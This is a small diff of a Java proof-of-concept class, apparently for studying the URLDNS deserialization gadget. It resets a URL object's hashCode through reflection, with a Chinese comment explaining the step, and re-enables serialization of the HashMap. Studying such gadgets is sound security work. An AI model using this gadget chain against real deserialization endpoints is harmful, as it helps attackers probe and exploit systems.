@@ -17,7 +17,7 @@ public class URLDNSEXP {
         hashmap.put(url,1);
         // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性
         hashcodefile.set(url,-1);
-        //serialize(hashmap);
+        serialize(hashmap);
         unserialize("ser.bin");
     }
 
